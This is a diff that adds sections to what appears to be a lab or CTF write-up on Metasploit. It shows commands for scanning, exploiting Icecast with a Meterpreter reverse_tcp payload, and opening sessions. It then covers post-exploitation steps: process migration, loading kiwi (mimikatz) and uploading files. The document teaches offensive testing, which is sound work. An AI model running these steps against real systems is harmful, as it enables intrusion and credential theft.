@@ -99,3 +99,89 @@ To load different modules not loaded in by default, you can use the `load` comma
 
 </p>
 </details>
+
+<details><summary>Move That Shell</summary>
+<p>
+
+![](/Metasploit/images/shell2.jpg)
+	
+Metasploit comes with a built-in way to run nmap and feed it's results directly into the database. Can run it via the `db_nmap -sV [IP]` command
+
+![](/Metasploit/images/nmap.png)
+
+On port 135, it identifies the service as MS RPC. By typing the `hosts` command into msfconsole, we can see waht information we have collected in the database
+
+![](/Metasploit/images/hosts.png)
+
+By typing `services`, we can see more information
+
+![](/Metasploit/images/services.png)
+
+It's worth noting that Metasploit will keep track of discovered vulnerabilities. One of the many ways the database can be leveraged powerfully and quickly. Done by typing `vulns`
+
+![](/Metasploit/images/vulns.png)
+
+Now that we've scanned the victim system, we can try connecting to it with a Metasploit payload. First, we have to search for the target payload. In Metasploit 5 you can simply type `use` followed by a unique string found within only the target exploit
+
+For example try it now with the following command `use icecast`. The full path for the exploit that appears in the prompt is `/exploit/windows/http/icecast_header`
+
+![](/Metasploit/images/icecast.png)
+
+While that command with the unique string can be incredibly useful, it is not quite the exploit we want. Now, run the command `search multi/handler`. We can use the number instead of the name of the module for quicker exploitation
+
+![](/Metasploit/images/number.png)
+
+Select the number 7 from the previous list and set the payload using the command `set PAYLOAD windows/meterpreter/reverse_tcp`. In this way, we can modify which payloads we want to use with our exploits. Additionally, run the command `set LHOST [IP]`
+
+![](/Metasploit/images/set.png)
+
+Next, go ahead and `use icecast` and set the RHOST to the IP via `set RHOSTS [ip]`
+
+![](/Metasploit/images/ice.png)
+
+Once the variables are set, run the exploit via the `exploit` command or the `run -j` command to run it as a job
+
+![](/Metasploit/images/meterpreter.png)
+
+Once started, we can check all of the jobs running on the system by running the `jobs` command
+
+After we have established our connection, we can list all of our sessions using the command `sessions`. Similiarly, we can interact with a target session using the command `sessions -i [number]`
+
+![](/Metasploit/images/sessions.png)
+
+</p>
+</details>
+
+<details><summary>We're In, Now What?</summary>
+<p>
+	
+![](/Metasploit/images/werein.png)
+
+Now that we have a shell into our victim machine, let's take a look at several post-exploitation modules actions we can leverage
+
+First things first, our initial shell/process typically is not very stable. Let's go ahead and attempt to move to a different process. First, let's list the processes using the command `ps`
+
+![](/Metasploit/images/ps.png)
+
+The name of the spool service is `spoolsv.exe`. We can try and migrate to that spool process. To migrate, simply type `migrate [PID]` along with the PID of the process
+
+![](/Metasploit/images/migrate.png)
+
+That migration did not work. Let's find out some more information about the system so we can try to elevate. The `getuid` command gives us more information regarding the current user running the process we are in
+
+![](/Metasploit/images/getuid.png)
+
+To find out more information about the system itself, we use the `sysinfo` command
+
+![](/Metasploit/images/sysinfo.png)
+
+To load a post exploitation module called mimikatz, we can type `load kiwi`
+
+![](/Metasploit/images/kiwi.png)
+
+If we want to transfer files to our victim, we use the `upload` command. If we want to run a Metasploit module, we use the `run` command. If we want to figure out the networking information and interfaces on our victim, we can run the `ipconfig` command
+
+![](/Metasploit/images/ip.png)
+
+</p>]
+</details>
